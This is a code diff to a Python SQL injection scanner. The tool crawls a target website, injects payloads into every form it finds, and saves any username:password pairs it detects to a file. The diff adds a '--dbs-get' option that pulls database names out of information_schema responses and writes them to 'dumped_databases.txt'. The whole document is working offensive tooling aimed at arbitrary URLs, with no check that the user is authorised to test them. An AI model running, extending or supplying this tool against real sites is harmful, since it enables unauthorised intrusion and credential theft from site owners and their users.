@@ -9,6 +9,7 @@ from bs4 import BeautifulSoup
 from collections import deque
 from requests.exceptions import RequestException
 import colorlog  # For colored logging
+import re
 
 # Setup colored logging
 LOG_FORMAT = "[%(levelname)s] %(message)s"
@@ -71,7 +72,7 @@ def get_random_user_agent():
     return random.choice(agents)
 
 # Function to perform SQL injection on a URL with the given payloads
-def test_sql_injection(url, method, form_data):
+def test_sql_injection(url, method, form_data, get_databases=False):
     for payload in payloads:
         data = form_data.copy()  # Avoid modifying original form data
         for key in data:
@@ -91,28 +92,30 @@ def test_sql_injection(url, method, form_data):
                 with lock:
                     found_vulnerabilities.append((url, payload, "Possible SQL Injection"))
                     logger.info(f"SQL Injection found at {url} with payload {payload}")
+            
             elif response.status_code == 200 and "mysql" in response.text.lower():  # MySQL-based vulnerability detection
                 with lock:
                     found_vulnerabilities.append((url, payload, "MySQL-based SQL Injection"))
                     logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
+            
             elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump
                 logger.info(f"[CREDENTIALS DUMP] Found credentials at {url} with payload {payload}")
                 dump_credentials(response.text)
                 break  # Stop further scanning after detecting vulnerability
 
-            # Print success message if vulnerability is detected
-            if response.status_code == 200 and ('username' in response.text or 'password' in response.text):
-                logger.info(f"[SUCCESS] ACCESS GRANTED WITH PAYLOAD: {payload}")
-                
+            # Check if -dbs-get option is set and dump databases
+            if get_databases:
+                if "information_schema.tables" in response.text:  # Check if tables were returned
+                    logger.info(f"Dumping databases from: {url} with payload {payload}")
+                    dump_databases(response.text)
+                    break  # Stop further scanning after detecting vulnerability
+
         except RequestException as e:
             logger.info(f"Error testing {url}: {str(e)}")
 
 # Function to save the credentials dump to a file
 def dump_credentials(data):
     # Look for the usernames and passwords in the response content.
-    # This is a simplified approach, assuming the credentials are easily extractable.
-    # Adjust this logic based on actual structure of the credentials data.
-    import re
     credentials = re.findall(r'(\w+)\s*:\s*(\S+)', data)  # Match username:password pairs
     if credentials:
         with open('dumped_credentials.txt', 'a') as f:
@@ -122,8 +125,21 @@ def dump_credentials(data):
     else:
         logger.info("No credentials found in response.")
 
+# Function to save the database dump to a file
+def dump_databases(data):
+    # Attempt to find database names from the response content.
+    # Adjust this logic to fit your SQL database's structure or response format.
+    databases = re.findall(r'`(.*?)`', data)  # Adjust the regex if needed to extract database names
+    if databases:
+        with open('dumped_databases.txt', 'a') as f:
+            for db in databases:
+                f.write(f"Database: {db}\n")
+        logger.info("Databases dumped to 'dumped_databases.txt'.")
+    else:
+        logger.info("No databases found in response.")
+
 # Function to scan forms on a page
-def scan_forms(url):
+def scan_forms(url, get_databases=False):
     try:
         response = requests.get(url, headers=headers, timeout=5)
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -144,14 +160,14 @@ def scan_forms(url):
                     form_data[name] = ""  # Empty data for injection
 
             if form_data:
-                test_sql_injection(action_url, method, form_data)
+                test_sql_injection(action_url, method, form_data, get_databases)
             else:
                 logger.info(f"No form inputs found on {url}.")
     except RequestException as e:
         logger.info(f"Error while fetching {url}: {str(e)}")
 
 # Function to crawl and explore the target URL (multiple pages)
-def crawl(url):
+def crawl(url, get_databases=False):
     urls_to_scan = deque([url])
     visited_urls = set()
 
@@ -163,7 +179,7 @@ def crawl(url):
 
         visited_urls.add(current_url)
         logger.info(f"Scanning {current_url}")
-        scan_forms(current_url)
+        scan_forms(current_url, get_databases)
 
         # Crawl links on the page
         try:
@@ -182,11 +198,11 @@ def crawl(url):
             logger.info(f"Error fetching links from {current_url}: {str(e)}")
 
 # Main function
-def main(target_url):
+def main(target_url, get_databases=False):
     logger.info(f"Starting SQL Injection scan on {target_url}")
     start_time = time.time()
 
-    crawl(target_url)
+    crawl(target_url, get_databases)
 
     if found_vulnerabilities:
         logger.info("SQL Injection vulnerabilities found:")
@@ -200,8 +216,9 @@ def main(target_url):
 
 if __name__ == '__main__':
     import argparse
-    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Credential Dumping")
+    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Database Dumping")
     parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
+    parser.add_argument('--dbs-get', action='store_true', help="Get list of databases from vulnerable target")
     args = parser.parse_args()
 
-    main(args.url)
+    main(args.url, get_databases=args.dbs_get)
